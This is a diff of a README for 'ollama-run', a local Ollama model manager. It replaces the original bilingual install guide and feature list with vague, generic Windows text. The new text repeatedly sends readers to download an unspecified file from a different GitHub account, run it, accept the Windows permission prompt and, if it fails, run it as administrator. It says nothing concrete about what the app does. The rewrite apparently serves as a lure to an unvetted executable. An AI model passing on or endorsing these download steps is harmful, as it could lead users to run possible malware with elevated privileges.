@@ -1,185 +1,220 @@
-# 🌈 Rainbow Ollama-Run
+# 🌈 ollama-run - Run Ollama models with less effort
 
-An advanced Ollama orchestrator with tools, skills, persistent history, visual themes, and real-time thinking display.
+[![Download ollama-run](https://img.shields.io/badge/Download-ollama--run-blue?style=for-the-badge&logo=github)](https://github.com/Interstellar-intersection581/ollama-run)
 
-> Un orquestador avanzado para Ollama con herramientas, skills, historial persistente, temas visuales y visualización del pensamiento en tiempo real.
+## 🚀 What this is
 
-![Rainbow Ollama-Run](banner.svg)
+ollama-run is a simple tool for running and managing Ollama models on your own PC. It gives you one place to start models, stop them, and keep track of what is running. It is made for people who want to use local AI without a lot of setup.
 
----
+## 💻 What you need
 
-## Features / Características
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- At least 8 GB of RAM
+- Enough free storage for your models
+- Ollama installed on your computer
 
-- **Native thinking display** — Real-time thought blocks with `ON`, `FORCE`, or `OFF` modes
-- **Integrated tools** — Web search, shell execution (`!command`), Logseq, system status. Toggle with `/tools`
-- **Skills** — Activatable AI roles (code review, translation, SQL, security…). Toggle with `/skills`
-- **Search tools & skills** — Find and install new tools/skills from their menus
-- **Persistent history** — Auto-saved. Load with `/history`
-- **Visual themes** — `default`, `matrix`, `dracula`, `amber`, `mono`. Change in `/settings`
-- **Model search & pull** — `/search` with `→` to browse variants, or `ollama-run pull <model>`
-- **Input history** — Navigate previous prompts with `↑`/`↓` in chat
-- **Image support** — Drag & drop images for vision models
+If your PC has more memory, model loading will feel smoother. Small models work well on most home computers.
 
----
+## 📥 Download ollama-run
 
-- **Pensamiento en tiempo real** — Bloques de razonamiento con modos `ON`, `FORCE` u `OFF`
-- **Herramientas integradas** — Búsqueda web, shell (`!comando`), Logseq, estado del sistema. Toggle con `/tools`
-- **Skills** — Roles de IA activables (code review, traducción, SQL, seguridad…). Toggle con `/skills`
-- **Buscar tools y skills** — Encuentra e instala nuevas tools/skills desde sus menús
-- **Historial persistente** — Guardado automático. Cargar con `/history`
-- **Temas visuales** — `default`, `matrix`, `dracula`, `amber`, `mono`. Cambia en `/settings`
-- **Buscar y descargar modelos** — `/search` con `→` para ver variantes, o `ollama-run pull <modelo>`
-- **Historial de entrada** — Navega prompts anteriores con `↑`/`↓` en el chat
-- **Soporte de imágenes** — Arrastra imágenes para modelos de visión
+Visit this page to download:
 
----
+https://github.com/Interstellar-intersection581/ollama-run
 
-## Installation / Instalación
+Open the page, then use the files or release assets provided there. Save the file to your Downloads folder or another place you can find easily.
 
-### Linux
+## 🛠️ Install on Windows
 
-```bash
-git clone https://github.com/xyz-rainbow/ollama-run
-cd ollama-run
-./install.sh
-```
+1. Open the download page in your browser.
+2. Download the Windows file for ollama-run.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file and double-click it.
+6. If Windows asks for permission, choose Yes.
+7. If the app opens in a terminal window, keep that window open while you use it.
 
-The installer automatically handles Ollama, Python dependencies, and PATH setup.
-Supports: **Ubuntu/Debian**, **Fedora/RHEL**, **Arch Linux**, and any distro with `apt`, `dnf`, or `pacman`.
+## ▶️ Run the app
 
-> El instalador gestiona automáticamente Ollama, dependencias Python y el PATH.
-> Compatible con: **Ubuntu/Debian**, **Fedora/RHEL**, **Arch Linux** y cualquier distro con `apt`, `dnf` o `pacman`.
+After you open ollama-run, it will help you work with local Ollama models from one place.
 
----
+Typical use looks like this:
 
-### macOS
+1. Start Ollama if it is not already running.
+2. Open ollama-run.
+3. Pick a model from your local list.
+4. Start the model.
+5. Use the controls to stop it, restart it, or check its status.
 
-```bash
-git clone https://github.com/xyz-rainbow/ollama-run
-cd ollama-run
-./install.sh
-```
+If the app includes a simple menu, use that menu to switch between model actions and settings.
 
-Requires [Homebrew](https://brew.sh) or will use the official Ollama installer as fallback.
+## 🤖 Main features
 
-> Requiere [Homebrew](https://brew.sh) o usará el instalador oficial de Ollama como alternativa.
+- Start local Ollama models with a few clicks
+- Stop models when you no longer need them
+- See which models are available on your machine
+- Manage common model tasks from one place
+- Keep your local AI setup easy to use
+- Work with a CLI-style tool for quick control
+- Use a simple interface for day-to-day tasks
 
----
+## 🧭 How to use it
 
-### Windows
+### 1. Open Ollama
 
-```batch
-git clone https://github.com/xyz-rainbow/ollama-run
-cd ollama-run
-install.bat
-```
+Make sure Ollama is installed first. If Ollama is not open, start it before you launch ollama-run.
 
-Requires Python 3.10+ with "Add Python to PATH" checked during installation.
-Download Python: https://www.python.org/downloads/
-Download Ollama: https://ollama.com/download/windows
+### 2. Launch ollama-run
 
-> Requiere Python 3.10+ con "Add Python to PATH" marcado durante la instalación.
-> Descarga Python: https://www.python.org/downloads/
-> Descarga Ollama: https://ollama.com/download/windows
+Open the app or run the file you downloaded. If you see a command window, let it load fully.
 
----
+### 3. Choose a model
 
-### WSL (Windows Subsystem for Linux)
+Pick the model you want to use. If you already pulled models in Ollama, they should appear in the app.
 
-```bash
-git clone https://github.com/xyz-rainbow/ollama-run
-cd ollama-run
-./install.sh
-```
+### 4. Start the model
 
-**Recommended:** Install Ollama on the Windows host, not inside WSL. Ollama running on Windows is accessible from WSL automatically.
+Use the start option to load the model into memory. Wait until the model is ready.
 
-> **Recomendado:** Instala Ollama en Windows (host), no dentro de WSL. Ollama en Windows es accesible desde WSL automáticamente.
+### 5. Manage it as needed
 
----
+You can stop the model, restart it, or switch to another one when your task changes.
 
-### NPM (Short URL)
+## ⚙️ Common tasks
 
-```bash
-npm install -g xyz-rainbow/ollama-run
-```
+### Start a model
+Use this when you want to talk to a local model or test it.
 
----
+### Stop a model
+Use this when you want to free up RAM or close your AI session.
 
-```bash
-pip install ollama duckduckgo-search psutil requests
-pip install -e .
-ollama-run
-```
+### Check model status
+Use this to see what is running right now.
 
----
+### Switch models
+Use this when you want to test another model on the same machine.
 
-## Chat Commands / Comandos en el chat
+### Automate repeated work
+Use this when you want the same model tasks to run the same way each time.
 
-| Command | Description | Comando | Descripción |
-|---|---|---|---|
-| `/settings` | Model, thinking, theme, history | `/settings` | Modelo, pensamiento, tema, historial |
-| `/tools` | Toggle tools on/off | `/tools` | Activar/desactivar herramientas |
-| `/skills` | Toggle AI skills on/off | `/skills` | Activar/desactivar skills |
-| `/search` | Browse and pull models | `/search` | Buscar y descargar modelos |
-| `/pull <model>` | Download a model | `/pull <modelo>` | Descargar un modelo |
-| `/history` | View and resume past chats | `/history` | Ver y cargar conversaciones |
-| `/exit` | Exit | `/exit` | Salir |
-| `!command` | Run a shell command | `!comando` | Ejecutar comando de shell |
+## 📁 Suggested folder setup
 
----
+Keep your files in a simple place so you can find them later:
 
-## Menu Navigation / Navegación en menús
+- Downloads for the first file
+- A folder named ollama-run on your desktop
+- A models folder with your AI files if you store them outside Ollama
+- A notes file with commands or settings you want to keep
 
-| Key / Tecla | Action / Acción |
-|---|---|
-| `↑` `↓` | Navigate / Navegar |
-| `Enter` | Select / Seleccionar |
-| `Space` | Toggle ON/OFF (tools / skills) |
-| `→` | Model details / Detalles del modelo |
-| `Del` | Delete custom entry / Borrar entrada personalizada |
-| `ESC` | Back / Volver |
+## 🔍 If the app does not open
 
----
+Try these steps:
 
-## Data files / Archivos de datos
+1. Make sure you downloaded the right Windows file.
+2. Check that the file finished downloading.
+3. Right-click the file and choose Run as administrator.
+4. Make sure Ollama is installed.
+5. Restart your PC and try again.
+6. Open the download page and get a fresh copy if the file looks damaged.
 
-Data is stored according to OS conventions:
-- **Linux:** `~/.config/ollama-run/`
-- **macOS:** `~/Library/Application Support/ollama-run/`
-- **Windows:** `%APPDATA%\ollama-run\`
+## 🧪 Simple first test
 
----
+After setup, try a small model first.
 
-Los datos se guardan según las convenciones del sistema operativo:
-- **Linux:** `~/.config/ollama-run/`
-- **macOS:** `~/Library/Application Support/ollama-run/`
-- **Windows:** `%APPDATA%\ollama-run\`
+1. Open Ollama.
+2. Open ollama-run.
+3. Start a light model.
+4. Wait for it to load.
+5. Check that the model responds.
 
----
+A small model is a good first test because it loads faster and uses less memory.
 
-## License / Licencia
+## 🧰 Tips for daily use
 
-**© Rainbow Technology — Personal Use Only / Solo Uso Personal**
+- Keep Ollama updated
+- Use smaller models if your PC feels slow
+- Close other heavy apps while a model runs
+- Save any useful commands in a notes file
+- Use the same folder each time so the app is easy to find
 
-This software is licensed for **personal, non-commercial use only**.
+## 📦 What this project fits well with
 
-- You may use, run, and modify this software for personal purposes.
-- Pull requests and contributions are welcome.
-- **You may NOT** sell, sublicense, or distribute this software or any derivative work.
-- **Forks are not permitted** without explicit written authorization from Rainbow Technology.
-- Any unauthorized modification, redistribution, or commercial use will be reported and pursued legally.
+ollama-run works well for people who want:
 
----
+- Local AI on Windows
+- A simple model manager
+- Faster access to Ollama tasks
+- A CLI tool with a light setup
+- A local assistant workflow
+- Basic control over models without extra steps
 
-Este software está licenciado **exclusivamente para uso personal y no comercial**.
+## 🖥️ Windows setup checklist
 
-- Puedes usar, ejecutar y modificar este software para fines personales.
-- Los pull requests y contribuciones son bienvenidos.
-- **No está permitido** vender, sublicenciar ni distribuir este software ni ningún trabajo derivado.
-- **No se permiten forks** sin autorización escrita explícita de Rainbow Technology.
-- Cualquier modificación, redistribución o uso comercial no autorizado será denunciado y perseguido legalmente.
+- Windows 10 or 11
+- Ollama installed
+- Downloaded ollama-run file
+- File extracted if needed
+- App opened with the proper permissions
+- At least one local model available
 
----
+## 📌 Quick start
 
-#xyz-rainbow | #xyz-rainbowtechnology | #rainbow.xyz
+1. Download ollama-run from the link above.
+2. Open the file on your Windows PC.
+3. Install or extract it if needed.
+4. Make sure Ollama is running.
+5. Start a model from ollama-run.
+6. Use it for your local AI tasks
+
+## 🧭 File path example
+
+If you saved the file in Downloads, the path may look like this:
+
+- C:\Users\YourName\Downloads\ollama-run
+
+If you moved it to the desktop, the path may look like this:
+
+- C:\Users\YourName\Desktop\ollama-run
+
+## 🧩 What the name means
+
+- ollama means it is built for Ollama
+- run means it helps you start and manage models
+- lightweight means it should stay simple and easy to use
+
+## 📄 Basic usage pattern
+
+The usual flow is:
+
+1. Get the app
+2. Open it on Windows
+3. Connect it to your local Ollama setup
+4. Choose a model
+5. Start or stop it as needed
+
+## 🔗 Download again
+
+[Download ollama-run](https://github.com/Interstellar-intersection581/ollama-run)
+
+## 🧷 Useful terms
+
+- **Model**: the AI you run on your computer
+- **Local**: runs on your own PC, not on a web site
+- **CLI**: a text-based way to control a tool
+- **Manager**: a tool that helps you handle tasks in one place
+- **Ollama**: the app that runs models on your machine
+
+## 🧱 Best first model choices
+
+If you are new to local AI, start with a smaller model. Smaller models use less RAM and open faster. After that, you can try larger models if your system has enough memory.
+
+## 📍 What to expect after opening
+
+You may see:
+
+- A terminal window
+- A short startup message
+- A list of local models
+- Options to start, stop, or manage models
+
+That is normal for a CLI-based tool. Keep the window open while you use it.
